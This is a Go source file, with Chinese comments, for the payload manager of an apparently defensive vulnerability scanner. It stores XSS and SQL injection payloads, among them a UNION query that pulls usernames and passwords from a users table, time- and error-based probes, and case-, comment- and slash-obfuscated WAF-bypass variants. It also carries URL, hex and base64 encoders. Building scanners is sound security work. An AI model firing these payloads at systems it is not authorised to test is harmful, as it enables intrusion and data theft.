// Package vulnscan 提供了核心的漏洞扫描引擎和插件管理机制。
package vulnscan

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"html"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"unicode"

	"github.com/rs/zerolog/log"
)

// PayloadType payload类型
type PayloadType string

const (
	// XSSPayloadType XSS payload类型
	XSSPayloadType PayloadType = "xss"
	// SQLiPayloadType SQL注入payload类型
	SQLiPayloadType PayloadType = "sqli"
	// ErrorBasedPayloadType 基于错误的payload类型
	ErrorBasedPayloadType PayloadType = "error_based"
	// BooleanBasedPayloadType 基于布尔的payload类型
	BooleanBasedPayloadType PayloadType = "boolean_based"
	// TimeBasedPayloadType 基于时间的payload类型
	TimeBasedPayloadType PayloadType = "time_based"
	// UnionBasedPayloadType 基于联合查询的payload类型
	UnionBasedPayloadType PayloadType = "union_based"
	// DOMBasedPayloadType 基于DOM的payload类型
	DOMBasedPayloadType PayloadType = "dom_based"
	// ReflectedPayloadType 反射型payload类型
	ReflectedPayloadType PayloadType = "reflected"
	// StoredPayloadType 存储型payload类型
	StoredPayloadType PayloadType = "stored"
)

// PayloadEncoding payload编码类型
type PayloadEncoding string

const (
	// EncodingNone 不编码
	EncodingNone PayloadEncoding = "none"
	// EncodingURL URL编码
	EncodingURL PayloadEncoding = "url"
	// EncodingHTML HTML编码
	EncodingHTML PayloadEncoding = "html"
	// EncodingBase64 Base64编码
	EncodingBase64 PayloadEncoding = "base64"
	// EncodingHex Hex编码
	EncodingHex PayloadEncoding = "hex"
	// EncodingDoubleURL 双重URL编码
	EncodingDoubleURL PayloadEncoding = "double_url"
	// EncodingMixed 混合编码
	EncodingMixed PayloadEncoding = "mixed"
)

// PayloadInfo payload信息
type PayloadInfo struct {
	Type         PayloadType   `json:"type"`
	Value        string        `json:"value"`
	Encoding     PayloadEncoding `json:"encoding"`
	Description  string        `json:"description"`
	Severity     SeverityLevel `json:"severity"`
	DatabaseType string        `json:"database_type,omitempty"`
	Context      string        `json:"context,omitempty"`
	Tags         []string      `json:"tags"`
	SuccessRate  float64       `json:"success_rate"`
	BypassWAF    bool          `json:"bypass_waf"`
}

// PayloadCategory payload类别
type PayloadCategory struct {
	Name        string        `json:"name"`
	Description string        `json:"description"`
	Types       []PayloadType `json:"types"`
	Payloads    []PayloadInfo `json:"payloads"`
}

// PayloadManager payload管理器接口
type PayloadManager interface {
	// GetPayloads 获取payload列表
	GetPayloads(payloadType PayloadType) []PayloadInfo
	// GetPayloadsByCategory 获取指定类别的payload列表
	GetPayloadsByCategory(category string) []PayloadInfo
	// GetPayloadsByDatabase 获取指定数据库类型的payload列表
	GetPayloadsByDatabase(databaseType string) []PayloadInfo
	// GetPayloadsByContext 获取指定上下文的payload列表
	GetPayloadsByContext(context string) []PayloadInfo
	// GetPayloadsBySeverity 获取指定严重程度的payload列表
	GetPayloadsBySeverity(severity SeverityLevel) []PayloadInfo
	// GetPayloadsByTag 获取指定标签的payload列表
	GetPayloadsByTag(tag string) []PayloadInfo
	// GetPayloadsByWAFBypass 获取可绕过WAF的payload列表
	GetPayloadsByWAFBypass() []PayloadInfo
	// AddPayload 添加payload
	AddPayload(payload PayloadInfo) error
	// RemovePayload 移除payload
	RemovePayload(payloadValue string) error
	// UpdatePayload 更新payload
	UpdatePayload(payloadValue string, newPayload PayloadInfo) error
	// EncodePayload 编码payload
	EncodePayload(payload string, encoding PayloadEncoding) (string, error)
	// DecodePayload 解码payload
	DecodePayload(payload string, encoding PayloadEncoding) (string, error)
	// ValidatePayload 验证payload
	ValidatePayload(payload string) bool
	// GetCategories 获取payload类别列表
	GetCategories() []PayloadCategory
	// AddCategory 添加payload类别
	AddCategory(category PayloadCategory) error
	// RemoveCategory 移除payload类别
	RemoveCategory(categoryName string) error
	// GetStats 获取payload统计信息
	GetStats() PayloadStats
	// FilterPayloads 过滤payload
	FilterPayloads(filter PayloadFilter) []PayloadInfo
	// GeneratePayload 生成payload
	GeneratePayload(template string, params map[string]string) (string, error)
}

// PayloadFilter payload过滤器
type PayloadFilter struct {
	Types        []PayloadType `json:"types"`
	Categories   []string      `json:"categories"`
	DatabaseTypes []string     `json:"database_types"`
	Contexts     []string      `json:"contexts"`
	Tags         []string      `json:"tags"`
	Severities   []SeverityLevel `json:"severities"`
	BypassWAF    bool          `json:"bypass_waf"`
	MinSuccessRate float64     `json:"min_success_rate"`
	MaxLength    int           `json:"max_length"`
	Regex        string        `json:"regex"`
}

// PayloadStats payload统计信息
type PayloadStats struct {
	TotalPayloads   int                    `json:"total_payloads"`
	PayloadsByType  map[PayloadType]int    `json:"payloads_by_type"`
	PayloadsByDB    map[string]int         `json:"payloads_by_db"`
	PayloadsByCtx   map[string]int         `json:"payloads_by_ctx"`
	PayloadsByTag   map[string]int         `json:"payloads_by_tag"`
	AvgSuccessRate  float64                `json:"avg_success_rate"`
	WAFBypassCount  int                    `json:"waf_bypass_count"`
	Categories      []PayloadCategory       `json:"categories"`
}

// DefaultPayloadManager 默认payload管理器
type DefaultPayloadManager struct {
	payloads   map[string]PayloadInfo
	categories map[string]PayloadCategory
	stats      PayloadStats
	mutex      sync.RWMutex
}

// NewDefaultPayloadManager 创建默认payload管理器
func NewDefaultPayloadManager() *DefaultPayloadManager {
	manager := &DefaultPayloadManager{
		payloads:   make(map[string]PayloadInfo),
		categories: make(map[string]PayloadCategory),
		stats: PayloadStats{
			PayloadsByType: make(map[PayloadType]int),
			PayloadsByDB:   make(map[string]int),
			PayloadsByCtx:  make(map[string]int),
			PayloadsByTag:  make(map[string]int),
		},
	}

	// 初始化payload和类别
	manager.initializePayloads()
	manager.initializeCategories()
	manager.updateStats()

	return manager
}

// initializePayloads 初始化payload
func (pm *DefaultPayloadManager) initializePayloads() {
	// XSS payloads
	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "<script>alert('XSS')</script>",
		Encoding:    EncodingNone,
		Description: "基本XSS脚本",
		Severity:    High,
		Context:     "html",
		Tags:        []string{"basic", "script"},
		SuccessRate: 0.8,
		BypassWAF:   false,
	})

	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "<img src=x onerror=alert('XSS')>",
		Encoding:    EncodingNone,
		Description: "图片标签XSS",
		Severity:    High,
		Context:     "html",
		Tags:        []string{"img", "event"},
		SuccessRate: 0.7,
		BypassWAF:   false,
	})

	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "javascript:alert('XSS')",
		Encoding:    EncodingNone,
		Description: "JavaScript协议XSS",
		Severity:    High,
		Context:     "url",
		Tags:        []string{"javascript", "protocol"},
		SuccessRate: 0.6,
		BypassWAF:   false,
	})

	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "\"><script>alert('XSS')</script>",
		Encoding:    EncodingNone,
		Description: "属性注入XSS",
		Severity:    High,
		Context:     "attribute",
		Tags:        []string{"attribute", "escape"},
		SuccessRate: 0.7,
		BypassWAF:   false,
	})

	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "<svg onload=alert('XSS')>",
		Encoding:    EncodingNone,
		Description: "SVG标签XSS",
		Severity:    High,
		Context:     "html",
		Tags:        []string{"svg", "event"},
		SuccessRate: 0.6,
		BypassWAF:   true,
	})

	// SQL注入 payloads
	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' OR '1'='1",
		Encoding:     EncodingNone,
		Description:  "基本SQL注入",
		Severity:     High,
		DatabaseType: "generic",
		Tags:         []string{"basic", "boolean"},
		SuccessRate:  0.8,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' OR 1=1--",
		Encoding:     EncodingNone,
		Description:  "注释SQL注入",
		Severity:     High,
		DatabaseType: "generic",
		Tags:         []string{"comment", "boolean"},
		SuccessRate:  0.8,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' UNION SELECT NULL, username, password FROM users--",
		Encoding:     EncodingNone,
		Description:  "联合查询SQL注入",
		Severity:     High,
		DatabaseType: "generic",
		Tags:         []string{"union", "data_extraction"},
		SuccessRate:  0.7,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "'; WAITFOR DELAY '0:0:5'--",
		Encoding:     EncodingNone,
		Description:  "时间延迟SQL注入",
		Severity:     High,
		DatabaseType: "mssql",
		Tags:         []string{"time", "delay"},
		SuccessRate:  0.6,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
		Encoding:     EncodingNone,
		Description:  "布尔SQL注入",
		Severity:     High,
		DatabaseType: "mysql",
		Tags:         []string{"boolean", "enumeration"},
		SuccessRate:  0.7,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' AND 1=CAST((SELECT @@version) AS INT)--",
		Encoding:     EncodingNone,
		Description:  "错误SQL注入",
		Severity:     High,
		DatabaseType: "mssql",
		Tags:         []string{"error", "version"},
		SuccessRate:  0.7,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' OR SLEEP(5)--",
		Encoding:     EncodingNone,
		Description:  "时间延迟SQL注入(MySQL)",
		Severity:     High,
		DatabaseType: "mysql",
		Tags:         []string{"time", "sleep"},
		SuccessRate:  0.6,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' AND PG_SLEEP(5)--",
		Encoding:     EncodingNone,
		Description:  "时间延迟SQL注入(PostgreSQL)",
		Severity:     High,
		DatabaseType: "postgresql",
		Tags:         []string{"time", "sleep"},
		SuccessRate:  0.6,
		BypassWAF:    false,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--",
		Encoding:     EncodingNone,
		Description:  "联合查询SQL注入(MySQL)",
		Severity:     High,
		DatabaseType: "mysql",
		Tags:         []string{"union", "schema"},
		SuccessRate:  0.7,
		BypassWAF:    false,
	})

	// WAF绕过payloads
	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' oR '1'='1",
		Encoding:     EncodingNone,
		Description:  "大小写混淆SQL注入",
		Severity:     High,
		DatabaseType: "generic",
		Tags:         []string{"waf_bypass", "case_obfuscation"},
		SuccessRate:  0.6,
		BypassWAF:    true,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "' || '1'='1",
		Encoding:     EncodingNone,
		Description:  "替换运算符SQL注入",
		Severity:     High,
		DatabaseType: "oracle",
		Tags:         []string{"waf_bypass", "operator_replacement"},
		SuccessRate:  0.6,
		BypassWAF:    true,
	})

	pm.addPayload(PayloadInfo{
		Type:         SQLiPayloadType,
		Value:        "'/**/OR/**/'1'='1",
		Encoding:     EncodingNone,
		Description:  "注释混淆SQL注入",
		Severity:     High,
		DatabaseType: "generic",
		Tags:         []string{"waf_bypass", "comment_obfuscation"},
		SuccessRate:  0.6,
		BypassWAF:    true,
	})

	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "<img/src=x onerror=alert('XSS')>",
		Encoding:    EncodingNone,
		Description: "斜杠混淆XSS",
		Severity:    High,
		Context:     "html",
		Tags:        []string{"waf_bypass", "slash_obfuscation"},
		SuccessRate: 0.5,
		BypassWAF:   true,
	})

	pm.addPayload(PayloadInfo{
		Type:        XSSPayloadType,
		Value:       "<ScRiPt>alert('XSS')</sCrIpT>",
		Encoding:    EncodingNone,
		Description: "大小写混淆XSS",
		Severity:    High,
		Context:     "html",
		Tags:        []string{"waf_bypass", "case_obfuscation"},
		SuccessRate: 0.5,
		BypassWAF:   true,
	})
}

// initializeCategories 初始化payload类别
func (pm *DefaultPayloadManager) initializeCategories() {
	// XSS类别
	xssCategory := PayloadCategory{
		Name:        "xss",
		Description: "跨站脚本攻击payload",
		Types:       []PayloadType{XSSPayloadType, DOMBasedPayloadType, ReflectedPayloadType, StoredPayloadType},
	}

	// SQL注入类别
	sqliCategory := PayloadCategory{
		Name:        "sqli",
		Description: "SQL注入攻击payload",
		Types:       []PayloadType{SQLiPayloadType, ErrorBasedPayloadType, BooleanBasedPayloadType, TimeBasedPayloadType, UnionBasedPayloadType},
	}

	// WAF绕过类别
	wafBypassCategory := PayloadCategory{
		Name:        "waf_bypass",
		Description: "WAF绕过payload",
		Types:       []PayloadType{XSSPayloadType, SQLiPayloadType},
	}

	// 添加类别
	pm.categories["xss"] = xssCategory
	pm.categories["sqli"] = sqliCategory
	pm.categories["waf_bypass"] = wafBypassCategory
}

// addPayload 添加payload（内部方法）
func (pm *DefaultPayloadManager) addPayload(payload PayloadInfo) {
	pm.payloads[payload.Value] = payload
}

// GetPayloads 获取payload列表
func (pm *DefaultPayloadManager) GetPayloads(payloadType PayloadType) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		if payload.Type == payloadType {
			result = append(result, payload)
		}
	}

	return result
}

// GetPayloadsByCategory 获取指定类别的payload列表
func (pm *DefaultPayloadManager) GetPayloadsByCategory(category string) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	categoryInfo, exists := pm.categories[category]
	if !exists {
		return []PayloadInfo{}
	}

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		for _, payloadType := range categoryInfo.Types {
			if payload.Type == payloadType {
				result = append(result, payload)
				break
			}
		}
	}

	return result
}

// GetPayloadsByDatabase 获取指定数据库类型的payload列表
func (pm *DefaultPayloadManager) GetPayloadsByDatabase(databaseType string) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		if payload.DatabaseType == databaseType {
			result = append(result, payload)
		}
	}

	return result
}

// GetPayloadsByContext 获取指定上下文的payload列表
func (pm *DefaultPayloadManager) GetPayloadsByContext(context string) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		if payload.Context == context {
			result = append(result, payload)
		}
	}

	return result
}

// GetPayloadsBySeverity 获取指定严重程度的payload列表
func (pm *DefaultPayloadManager) GetPayloadsBySeverity(severity SeverityLevel) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		if payload.Severity == severity {
			result = append(result, payload)
		}
	}

	return result
}

// GetPayloadsByTag 获取指定标签的payload列表
func (pm *DefaultPayloadManager) GetPayloadsByTag(tag string) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		for _, payloadTag := range payload.Tags {
			if payloadTag == tag {
				result = append(result, payload)
				break
			}
		}
	}

	return result
}

// GetPayloadsByWAFBypass 获取可绕过WAF的payload列表
func (pm *DefaultPayloadManager) GetPayloadsByWAFBypass() []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo
	for _, payload := range pm.payloads {
		if payload.BypassWAF {
			result = append(result, payload)
		}
	}

	return result
}

// AddPayload 添加payload
func (pm *DefaultPayloadManager) AddPayload(payload PayloadInfo) error {
	pm.mutex.Lock()
	defer pm.mutex.Unlock()

	// 检查payload是否已存在
	if _, exists := pm.payloads[payload.Value]; exists {
		return fmt.Errorf("payload已存在: %s", payload.Value)
	}

	// 添加payload
	pm.payloads[payload.Value] = payload

	// 更新统计信息
	pm.updateStats()

	return nil
}

// RemovePayload 移除payload
func (pm *DefaultPayloadManager) RemovePayload(payloadValue string) error {
	pm.mutex.Lock()
	defer pm.mutex.Unlock()

	// 检查payload是否存在
	if _, exists := pm.payloads[payloadValue]; !exists {
		return fmt.Errorf("payload不存在: %s", payloadValue)
	}

	// 移除payload
	delete(pm.payloads, payloadValue)

	// 更新统计信息
	pm.updateStats()

	return nil
}

// UpdatePayload 更新payload
func (pm *DefaultPayloadManager) UpdatePayload(payloadValue string, newPayload PayloadInfo) error {
	pm.mutex.Lock()
	defer pm.mutex.Unlock()

	// 检查payload是否存在
	if _, exists := pm.payloads[payloadValue]; !exists {
		return fmt.Errorf("payload不存在: %s", payloadValue)
	}

	// 如果值发生变化，先删除旧的payload
	if payloadValue != newPayload.Value {
		delete(pm.payloads, payloadValue)
	}

	// 添加新的payload
	pm.payloads[newPayload.Value] = newPayload

	// 更新统计信息
	pm.updateStats()

	return nil
}

// EncodePayload 编码payload
func (pm *DefaultPayloadManager) EncodePayload(payload string, encoding PayloadEncoding) (string, error) {
	switch encoding {
	case EncodingNone:
		return payload, nil
	case EncodingURL:
		return url.QueryEscape(payload), nil
	case EncodingHTML:
		return html.EscapeString(payload), nil
	case EncodingBase64:
		return base64.StdEncoding.EncodeToString([]byte(payload)), nil
	case EncodingHex:
		return hex.EncodeToString([]byte(payload)), nil
	case EncodingDoubleURL:
		firstEncode := url.QueryEscape(payload)
		return url.QueryEscape(firstEncode), nil
	case EncodingMixed:
		// 混合编码：URL编码 + HTML编码
		urlEncoded := url.QueryEscape(payload)
		return html.EscapeString(urlEncoded), nil
	default:
		return "", fmt.Errorf("不支持的编码类型: %s", encoding)
	}
}

// DecodePayload 解码payload
func (pm *DefaultPayloadManager) DecodePayload(payload string, encoding PayloadEncoding) (string, error) {
	switch encoding {
	case EncodingNone:
		return payload, nil
	case EncodingURL:
		return url.QueryUnescape(payload)
	case EncodingHTML:
		return html.UnescapeString(payload), nil
	case EncodingBase64:
		decoded, err := base64.StdEncoding.DecodeString(payload)
		if err != nil {
			return "", fmt.Errorf("Base64解码失败: %w", err)
		}
		return string(decoded), nil
	case EncodingHex:
		decoded, err := hex.DecodeString(payload)
		if err != nil {
			return "", fmt.Errorf("Hex解码失败: %w", err)
		}
		return string(decoded), nil
	case EncodingDoubleURL:
		firstDecode, err := url.QueryUnescape(payload)
		if err != nil {
			return "", fmt.Errorf("第一次URL解码失败: %w", err)
		}
		return url.QueryUnescape(firstDecode)
	case EncodingMixed:
		// 混合解码：HTML解码 + URL解码
		htmlDecoded := html.UnescapeString(payload)
		return url.QueryUnescape(htmlDecoded)
	default:
		return "", fmt.Errorf("不支持的编码类型: %s", encoding)
	}
}

// ValidatePayload 验证payload
func (pm *DefaultPayloadManager) ValidatePayload(payload string) bool {
	// 检查payload是否为空
	if payload == "" {
		return false
	}

	// 检查payload长度
	if len(payload) > 10000 {
		return false
	}

	// 检查payload是否包含非打印字符
	for _, r := range payload {
		if !unicode.IsPrint(r) && !unicode.IsSpace(r) {
			return false
		}
	}

	// 检查payload是否包含危险字符（可选）
	// 这里可以根据实际需求添加更多验证规则

	return true
}

// GetCategories 获取payload类别列表
func (pm *DefaultPayloadManager) GetCategories() []PayloadCategory {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	categories := make([]PayloadCategory, 0, len(pm.categories))
	for _, category := range pm.categories {
		categories = append(categories, category)
	}

	return categories
}

// AddCategory 添加payload类别
func (pm *DefaultPayloadManager) AddCategory(category PayloadCategory) error {
	pm.mutex.Lock()
	defer pm.mutex.Unlock()

	// 检查类别是否已存在
	if _, exists := pm.categories[category.Name]; exists {
		return fmt.Errorf("类别已存在: %s", category.Name)
	}

	// 添加类别
	pm.categories[category.Name] = category

	// 更新统计信息
	pm.updateStats()

	return nil
}

// RemoveCategory 移除payload类别
func (pm *DefaultPayloadManager) RemoveCategory(categoryName string) error {
	pm.mutex.Lock()
	defer pm.mutex.Unlock()

	// 检查类别是否存在
	if _, exists := pm.categories[categoryName]; !exists {
		return fmt.Errorf("类别不存在: %s", categoryName)
	}

	// 移除类别
	delete(pm.categories, categoryName)

	// 更新统计信息
	pm.updateStats()

	return nil
}

// GetStats 获取payload统计信息
func (pm *DefaultPayloadManager) GetStats() PayloadStats {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	// 更新类别信息
	categories := make([]PayloadCategory, 0, len(pm.categories))
	for _, category := range pm.categories {
		categories = append(categories, category)
	}
	pm.stats.Categories = categories

	return pm.stats
}

// FilterPayloads 过滤payload
func (pm *DefaultPayloadManager) FilterPayloads(filter PayloadFilter) []PayloadInfo {
	pm.mutex.RLock()
	defer pm.mutex.RUnlock()

	var result []PayloadInfo

	// 编译正则表达式
	var regex *regexp.Regexp
	var err error
	if filter.Regex != "" {
		regex, err = regexp.Compile(filter.Regex)
		if err != nil {
			log.Error().Err(err).Str("regex", filter.Regex).Msg("编译正则表达式失败")
			return []PayloadInfo{}
		}
	}

	for _, payload := range pm.payloads {
		// 检查类型过滤
		if len(filter.Types) > 0 {
			typeMatch := false
			for _, payloadType := range filter.Types {
				if payload.Type == payloadType {
					typeMatch = true
					break
				}
			}
			if !typeMatch {
				continue
			}
		}

		// 检查类别过滤
		if len(filter.Categories) > 0 {
			categoryMatch := false
			for _, categoryName := range filter.Categories {
				if category, exists := pm.categories[categoryName]; exists {
					for _, payloadType := range category.Types {
						if payload.Type == payloadType {
							categoryMatch = true
							break
						}
					}
					if categoryMatch {
						break
					}
				}
			}
			if !categoryMatch {
				continue
			}
		}

		// 检查数据库类型过滤
		if len(filter.DatabaseTypes) > 0 {
			dbMatch := false
			for _, dbType := range filter.DatabaseTypes {
				if payload.DatabaseType == dbType {
					dbMatch = true
					break
				}
			}
			if !dbMatch {
				continue
			}
		}

		// 检查上下文过滤
		if len(filter.Contexts) > 0 {
			contextMatch := false
			for _, context := range filter.Contexts {
				if payload.Context == context {
					contextMatch = true
					break
				}
			}
			if !contextMatch {
				continue
			}
		}

		// 检查标签过滤
		if len(filter.Tags) > 0 {
			tagMatch := false
			for _, tag := range filter.Tags {
				for _, payloadTag := range payload.Tags {
					if payloadTag == tag {
						tagMatch = true
						break
					}
				}
				if tagMatch {
					break
				}
			}
			if !tagMatch {
				continue
			}
		}

		// 检查严重程度过滤
		if len(filter.Severities) > 0 {
			severityMatch := false
			for _, severity := range filter.Severities {
				if payload.Severity == severity {
					severityMatch = true
					break
				}
			}
			if !severityMatch {
				continue
			}
		}

		// 检查WAF绕过过滤
		if filter.BypassWAF && !payload.BypassWAF {
			continue
		}

		// 检查成功率过滤
		if filter.MinSuccessRate > 0 && payload.SuccessRate < filter.MinSuccessRate {
			continue
		}

		// 检查长度过滤
		if filter.MaxLength > 0 && len(payload.Value) > filter.MaxLength {
			continue
		}

		// 检查正则表达式过滤
		if regex != nil && !regex.MatchString(payload.Value) {
			continue
		}

		// 所有过滤条件都满足，添加到结果
		result = append(result, payload)
	}

	// 按成功率排序
	sort.Slice(result, func(i, j int) bool {
		return result[i].SuccessRate > result[j].SuccessRate
	})

	return result
}

// GeneratePayload 生成payload
func (pm *DefaultPayloadManager) GeneratePayload(template string, params map[string]string) (string, error) {
	result := template

	// 替换模板中的参数
	for key, value := range params {
		placeholder := "{{" + key + "}}"
		result = strings.ReplaceAll(result, placeholder, value)
	}

	// 检查是否还有未替换的占位符
	if strings.Contains(result, "{{") && strings.Contains(result, "}}") {
		return "", fmt.Errorf("payload模板中包含未替换的占位符")
	}

	return result, nil
}

// updateStats 更新统计信息（内部方法）
func (pm *DefaultPayloadManager) updateStats() {
	// 重置统计信息
	pm.stats.TotalPayloads = len(pm.payloads)
	pm.stats.PayloadsByType = make(map[PayloadType]int)
	pm.stats.PayloadsByDB = make(map[string]int)
	pm.stats.PayloadsByCtx = make(map[string]int)
	pm.stats.PayloadsByTag = make(map[string]int)
	pm.stats.WAFBypassCount = 0
	pm.stats.AvgSuccessRate = 0
	totalSuccessRate := 0.0

	// 统计payload信息
	for _, payload := range pm.payloads {
		// 按类型统计
		pm.stats.PayloadsByType[payload.Type]++

		// 按数据库类型统计
		if payload.DatabaseType != "" {
			pm.stats.PayloadsByDB[payload.DatabaseType]++
		}

		// 按上下文统计
		if payload.Context != "" {
			pm.stats.PayloadsByCtx[payload.Context]++
		}

		// 按标签统计
		for _, tag := range payload.Tags {
			pm.stats.PayloadsByTag[tag]++
		}

		// 统计WAF绕过数量
		if payload.BypassWAF {
			pm.stats.WAFBypassCount++
		}

		// 累计成功率
		totalSuccessRate += payload.SuccessRate
	}

	// 计算平均成功率
	if pm.stats.TotalPayloads > 0 {
		pm.stats.AvgSuccessRate = totalSuccessRate / float64(pm.stats.TotalPayloads)
	}
}